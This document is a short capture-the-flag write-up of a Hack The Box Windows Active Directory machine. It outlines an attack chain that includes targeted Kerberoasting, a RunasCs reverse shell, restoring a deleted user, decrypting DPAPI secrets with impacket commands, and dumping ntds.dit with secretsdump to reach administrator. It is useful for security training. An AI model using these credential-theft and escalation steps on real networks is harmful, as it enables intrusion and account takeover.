---
public: "true"
tags:
  - "#htb"
  - Windows
  - Active-Directory
  - "#dpapi"
created-at: 2026-04-01
---

# Information

- Machine name: Voleur
- OS: Windows
- Difficulty: Medium

# Attack Path

- Have credentials for `ryan.naylor` given. NTLM auth is disabled
- Access to SMB share `IT` and excel sheet (password protected, use `office2john`) with creds and info
- This gives creds for `svc_ldap` user. This user can perform targeted kerberoast on `svc_winrm` (and another user).
- `svc_winrm` has winrm access -> local flag
- get reverse shell with `RunasCs` as `svc_ldap`. This user can list and restore the deleted user `todd.wolfe`, whose password is in the initial excel
- `todd.wolfe` can read `IT` share and his own user directory is in it. Use that to dump and decrypt DPAPI credentials, which has password for `jeremy.combs`
- `jeremy.combs` can access `IT` share with `id_rsa` for `svc_backup`. The backup user can SSH into wsl and read a backup at `C:\IT\Third-Line Support\Backups` (in `/mnt/c`). This contains `ntds.dit` and `SYSTEM`
- Use `secretsdump` to get hash of administrator, get TGT with hash and evil-winrm into the machine as admin -> root flag.

Get deleted users and restore:

```
Import-Module ActiveDirectory
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
Restore-ADObject -Identity 'CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb'
```

Decrypt DPAPI masterkey:

```
impacket-dpapi masterkey -dc-ip $DCIP -k -no-pass -t 'voleur.htb/todd.wolfe@dc.voleur.htb' -file 08949382-134f-4c63-b93c-ce52efc0aa88
```

Decrypt DPAPI credential:

```
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

# Lessons Learned

- You can use [RunasCs](https://github.com/antonioCoco/RunasCs) to get a reverse shell as any user when you have winrm access.
- Deleted objects may only be visible by certain users
- DPAPI secrets can be in both `local` and `roaming`

# References

- <https://github.com/antonioCoco/RunasCs>
